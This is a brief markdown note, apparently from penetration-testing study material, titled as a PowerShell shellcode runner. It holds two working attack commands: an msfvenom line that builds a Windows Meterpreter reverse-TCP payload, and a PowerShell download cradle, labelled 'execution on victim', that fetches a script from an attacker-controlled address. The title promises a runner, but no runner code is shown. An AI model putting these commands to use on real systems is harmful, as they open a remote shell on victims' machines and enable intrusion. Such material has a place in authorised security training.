# Basic Shellcode runner in PS

The code is a direct port from vba

```powershell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f ps1 EXITFUNC=thread
```

execution on victim

```powershell
(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1')
```
